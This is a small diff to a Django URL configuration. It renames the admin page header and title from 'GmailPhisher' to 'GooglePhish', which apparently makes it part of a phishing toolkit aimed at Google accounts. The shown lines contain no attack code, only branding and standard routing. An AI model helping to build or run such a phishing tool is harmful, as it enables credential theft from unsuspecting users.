@@ -17,8 +17,8 @@ from django.contrib import admin
 from django.urls import path
 from django.urls.conf import include, include
 
-admin.site.site_header = 'GmailPhisher Admin Page'
-admin.site.site_title = 'GmailPhishser Admin Login'
+admin.site.site_header = 'GooglePhish Admin Page'
+admin.site.site_title = 'GooglePhish Admin Login'
 
 urlpatterns = [
     path('admin/', admin.site.urls),
